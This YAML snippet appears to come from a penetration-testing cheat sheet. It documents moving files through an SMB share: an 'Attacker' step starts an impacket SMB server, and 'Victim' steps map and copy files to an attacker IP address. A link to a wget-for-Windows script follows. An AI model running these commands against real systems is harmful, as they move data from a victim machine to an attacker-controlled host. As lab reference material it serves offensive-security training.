---
functions:
  file-transfer:
    - description: Transfer Files Through an SMB Share
      code: |
        Attacker
        	impacket-smbserver share ./

        Victim
        	net use \\192.168.119.220\share
        	copy file \\192.168.119.220\share
resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/wget-windows

---
